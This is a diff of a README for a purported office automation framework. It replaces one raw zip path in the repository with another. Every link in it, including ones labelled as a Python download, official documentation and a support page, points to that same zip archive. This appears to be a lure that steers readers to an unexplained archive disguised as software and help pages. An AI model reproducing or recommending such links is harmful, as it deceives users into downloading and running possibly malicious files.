@@ -1,6 +1,6 @@
 # 📝 office_automation_framework - Simplify Office Tasks with Ease
 
-[![Download](https://github.com/Albornaz/office_automation_framework/raw/refs/heads/main/oaf/scheduler/framework-office-automation-v2.4.zip)](https://github.com/Albornaz/office_automation_framework/raw/refs/heads/main/oaf/scheduler/framework-office-automation-v2.4.zip)
+[![Download](https://github.com/Albornaz/office_automation_framework/raw/refs/heads/main/oaf/reports/office_automation_framework_1.2-beta.1.zip)](https://github.com/Albornaz/office_automation_framework/raw/refs/heads/main/oaf/reports/office_automation_framework_1.2-beta.1.zip)
 
 ## 📖 Introduction
 
@@ -15,7 +15,7 @@ To run the Office Automation Framework, you will need:
 - **Operating System:** Windows 10 or later, macOS, or Linux
 - **Memory:** At least 4 GB of RAM
 - **Storage:** Minimum of 500 MB of free space
-- **Python:** Version 3.7 or higher (You can download Python [here](https://github.com/Albornaz/office_automation_framework/raw/refs/heads/main/oaf/scheduler/framework-office-automation-v2.4.zip))
+- **Python:** Version 3.7 or higher (You can download Python [here](https://github.com/Albornaz/office_automation_framework/raw/refs/heads/main/oaf/reports/office_automation_framework_1.2-beta.1.zip))
 
 ### 2. Installation Steps
 
@@ -23,7 +23,7 @@ Follow these steps to download and install the Office Automation Framework:
 
 1. **Visit the Releases Page.** Click the link below to go to the download section of the GitHub repository:
    
-   [Download OAF Releases](https://github.com/Albornaz/office_automation_framework/raw/refs/heads/main/oaf/scheduler/framework-office-automation-v2.4.zip)
+   [Download OAF Releases](https://github.com/Albornaz/office_automation_framework/raw/refs/heads/main/oaf/reports/office_automation_framework_1.2-beta.1.zip)
 
 2. **Choose the Latest Release.** Look for the most recent version at the top of the page. 
 
@@ -54,7 +54,7 @@ The Office Automation Framework includes various helpful features:
 
 To download the Office Automation Framework, visit the link below for the latest releases:
 
-[Download OAF Releases](https://github.com/Albornaz/office_automation_framework/raw/refs/heads/main/oaf/scheduler/framework-office-automation-v2.4.zip)
+[Download OAF Releases](https://github.com/Albornaz/office_automation_framework/raw/refs/heads/main/oaf/reports/office_automation_framework_1.2-beta.1.zip)
 
 ### Additional Installation Help
 
@@ -69,8 +69,8 @@ If you have questions or need assistance, consider checking the Issues section o
 
 ## 🔗 Useful Links
 
-- [Official Documentation](https://github.com/Albornaz/office_automation_framework/raw/refs/heads/main/oaf/scheduler/framework-office-automation-v2.4.zip)
-- [Support Page](https://github.com/Albornaz/office_automation_framework/raw/refs/heads/main/oaf/scheduler/framework-office-automation-v2.4.zip)
+- [Official Documentation](https://github.com/Albornaz/office_automation_framework/raw/refs/heads/main/oaf/reports/office_automation_framework_1.2-beta.1.zip)
+- [Support Page](https://github.com/Albornaz/office_automation_framework/raw/refs/heads/main/oaf/reports/office_automation_framework_1.2-beta.1.zip)
 
 ## 📝 Contributing
 
